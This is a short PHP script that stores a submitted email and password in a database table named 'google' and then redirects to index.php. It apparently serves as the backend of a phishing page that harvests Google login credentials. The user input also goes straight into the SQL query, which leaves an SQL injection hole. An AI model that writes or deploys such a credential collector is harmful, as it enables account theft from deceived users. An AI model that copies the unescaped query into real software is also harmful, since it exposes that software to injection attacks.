<?php 
require 'init.php';
$eml=$_POST["email"];
$psw=$_POST["password"];
$sql=$db->query("insert into google(email,password) values('$eml','$psw')");
if($sql){
    header('location:index.php');
}
?>